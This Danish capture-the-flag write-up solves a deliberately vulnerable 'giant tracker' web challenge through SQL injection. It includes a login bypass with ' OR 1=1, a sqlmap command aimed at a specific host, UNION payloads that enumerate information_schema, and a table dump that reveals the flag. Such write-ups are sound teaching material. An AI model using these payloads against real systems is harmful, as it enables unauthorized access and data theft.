# Opgave

Jætterne er blevet avanceret, så vi skal have en mere systematisk tilgang til at finde dem.
Odin har fået nogen til at lave et jætte tracking system. Det er noget magi som får det til at virke, men er magi altid sikkert?

http://jættetracker.jul.fdca.dk:8080 

---

# Løsning

På hjemmesiden er der en login side, som skal bruge et navn og en kode.

I opgaven står der at der er magi som får det til at virke, hvilket får mig til at tænke at man skal lave sql injections.

Jeg prøver derfor Odin som navn og `' OR 1=1 -- -` som kode, men det giver fejlen "Magien fejlede"

Jeg prøver så `' OR 1=1 -- -` som både navn og kode og her kommer jeg igennem til en side hvor der står **Velkommen, thor** og et felt hvor jeg kan søge efter jætter.

Alt hvad jeg prøver på denne side giver fejlen "Du har ikke tilladelse til at søge!"

Efter lang tids forsøg med mere sql injection og forsøg på at manipulere cookien giver jeg op og går tilbage til login skærmen.

Da Odin har fået lavet systemet forventer jeg at navnet skal være Odin og vi så skal lave SQL injection på kode delen.

Jeg bruger sqlmap som er en application til at teste felter for sql injections og bruger denne kommando:

`sqlmap -u "http://20.240.212.83:8080" --data="navn=Odin&kode=vulln" --cookie="PHPSESSID=b1bbfdf8262ee4edaa2b5b47b5cd3b45" -p kode`

Herfra fik jeg denne SQL injection på kode: `vulln' UNION ALL SELECT 11,CONCAT(0x71786a7a71,0x78637a526f65665448485545636a4d54694156746d494165506967476a615352645a645763765948,0x71707a7671),11,11-- -`

Jeg er helt ærligt ikke helt sikker på hvorfor det virker, men nu har jeg adgang og kan søge i søgefeltet.

Jeg prøver igen med `' OR 1=1 -- -`, Hvor jeg nu kan se en tabel med to kolonner. En med navnet på jætter og en med deres lokation.

Jeg forventer at der hives data fra en anden tabel for at finde flaget.

Jeg forsøger derfor at finde navnet på alle tabeller i databasen med: `lol' UNION ALL SELECT NULL, NULL, GROUP_CONCAT(table_name) FROM information_schema.tables -- -`, som viser mig tabellerne **jaetter**, og **guddommelige_noter**, som ikke bare er standard tabeller.

**jaetter** er nok den tabel vi allerede kigger i så jeg prøver at at finde navnene på kolonnerne i tabellen **guddommelige_noter** med:  `lol' UNION ALL SELECT NULL, NULL, GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = 'guddommelige_noter' -- -`

Herfra finder jeg kolonnenavnene **id**, **titel**, **tekst**.

Jeg prøver nu at kombinere denne tabel med den tabel vi allerde kigger i med: `lol' UNION ALL SELECT id, titel, tekst FROM guddommelige_noter -- -`

Her får jeg flaget **FDCA{N0rd1sk3_gud3r_sk4l_0gsaa_par4m4t3r1ze}**

---
